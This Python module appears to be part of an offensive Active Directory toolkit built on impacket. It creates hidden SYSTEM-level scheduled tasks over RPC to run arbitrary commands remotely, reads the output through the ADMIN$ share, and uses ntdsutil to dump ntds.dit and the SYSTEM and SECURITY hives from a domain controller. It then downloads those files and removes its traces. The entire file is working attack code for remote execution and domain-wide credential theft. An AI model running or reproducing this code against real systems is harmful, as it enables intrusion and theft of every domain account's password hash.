from __future__ import annotations

import logging
import ntpath
import random
import string
import time
from pathlib import Path

from .. import console
from .target import Target, connect_smb

_TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
"""


def _xml_escape(data: str) -> str:
    table = {"&": "&amp;", '"': "&quot;", "'": "&apos;", ">": "&gt;", "<": "&lt;"}
    return "".join(table.get(char, char) for char in data)


def _random_name(length: int = 8) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(length))


class TaskExec:
    def __init__(self, target: Target, command: str):
        self._target = target
        self._command = command

    def run(self) -> None:
        from impacket.dcerpc.v5 import transport

        binding = r"ncacn_np:%s[\pipe\atsvc]" % self._target.host
        rpctransport = transport.DCERPCTransportFactory(binding)
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                self._target.username,
                self._target.password,
                self._target.domain,
                self._target.lmhash,
                self._target.nthash,
                self._target.aes_key,
            )
            rpctransport.set_kerberos(self._target.do_kerberos, self._target.dc_ip)
        try:
            self._execute(rpctransport)
        except Exception as exc:
            logging.error(exc)
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(exc):
                console.warn("STATUS_OBJECT_NAME_NOT_FOUND received; retrying may help.")

    def _execute(self, rpctransport) -> None:
        from impacket.dcerpc.v5 import tsch
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.dcerpc.v5.rpcrt import (
            RPC_C_AUTHN_GSS_NEGOTIATE,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        )

        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        if self._target.do_kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        task_name = _random_name()
        tmp_file = task_name + ".tmp"
        args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self._command, tmp_file)
        xml = _TASK_XML % (_xml_escape("cmd.exe"), _xml_escape(args))

        task_created = False
        try:
            tsch.hSchRpcRegisterTask(dce, "\\%s" % task_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            task_created = True
            tsch.hSchRpcRun(dce, "\\%s" % task_name)

            done = False
            while not done:
                resp = tsch.hSchRpcGetLastRunInfo(dce, "\\%s" % task_name)
                if resp["pLastRuntime"]["wYear"] != 0:
                    done = True
                else:
                    time.sleep(2)
        finally:
            if task_created:
                try:
                    tsch.hSchRpcDelete(dce, "\\%s" % task_name)
                except Exception:
                    pass

        smb = rpctransport.get_smb_connection()
        tmp_rel = "Temp\\%s" % tmp_file
        wait_once = True
        while True:
            try:
                smb.getFile("ADMIN$", tmp_rel, lambda _data: None)
                break
            except Exception as exc:
                message = str(exc)
                if "SHARING" in message:
                    time.sleep(3)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in message:
                    if wait_once:
                        time.sleep(3)
                        wait_once = False
                    else:
                        break
                else:
                    break

        try:
            smb.deleteFile("ADMIN$", tmp_rel)
        except Exception:
            pass
        dce.disconnect()

class NtdsutilDumper:
    SHARE = "ADMIN$"
    TMP_DIR = "C:\\Windows\\Temp\\"

    def __init__(self, target: Target, output_dir: Path):
        self._target = target
        self._output_dir = Path(output_dir)
        self._smb = None
        self._dump_name = _random_name()

    @property
    def _tmp_share_path(self) -> str:
        return self.TMP_DIR.split("C:\\Windows\\")[1]

    def _is_admin(self) -> bool:
        try:
            self._smb.connectTree("C$")
            return True
        except Exception:
            return False

    def run(self) -> None:
        self._smb = connect_smb(self._target)
        if not self._is_admin():
            raise PermissionError("Provided account is not a local admin on the target.")

        console.info(
            "Connected to %s as %s\\%s (admin)"
            % (self._target.host, self._target.domain, self._target.username)
        )

        dump_path = self.TMP_DIR + self._dump_name
        console.info("Dumping NTDS with ntdsutil.exe to %s" % dump_path)
        command = (
            "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' "
            "'create full %s' q q\"" % dump_path
        )
        TaskExec(self._target, command).run()

        self._output_dir.mkdir(parents=True, exist_ok=True)

        if not self._verify_dumped():
            raise RuntimeError("ntds.dit was not created on the target.")
        console.info("NTDS successfully dumped on target")

        self._download_all()
        console.info("NTDS artefacts copied to %s" % self._output_dir)

        self._cleanup(dump_path)

    def _verify_dumped(self, attempts: int = 10, delay: float = 3.0) -> bool:
        remote = ntpath.normpath(
            self._tmp_share_path + self._dump_name + "\\Active Directory\\ntds.dit"
        )
        for _ in range(attempts):
            try:
                entries = self._smb.listPath(shareName=self.SHARE, path=remote)
                if any(entry.get_longname() == "ntds.dit" for entry in entries):
                    return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def _download(self, remote_rel: str, local_name: str) -> None:
        remote = self._tmp_share_path + self._dump_name + remote_rel
        local = self._output_dir / local_name
        with open(local, "wb") as handle:
            try:
                self._smb.getFile(self.SHARE, remote, handle.write)
            except Exception as exc:
                console.error("Error retrieving %s: %s" % (local_name, exc))

    def _download_all(self) -> None:
        console.info("Copying NTDS dump to %s" % self._output_dir)
        self._download("\\Active Directory\\ntds.dit", "ntds.dit")
        self._download("\\registry\\SYSTEM", "SYSTEM")
        self._download("\\registry\\SECURITY", "SECURITY")

    def _cleanup(self, dump_path: str) -> None:
        try:
            TaskExec(self._target, "rmdir /s /q %s" % dump_path).run()
            console.info("Removed dump directory %s on target" % dump_path)
        except Exception as exc:
            console.warn("Could not remove remote dump directory: %s" % exc)

def download_ntds_files(target: Target, output_dir: Path) -> Path:
    NtdsutilDumper(target, output_dir).run()
    return Path(output_dir)
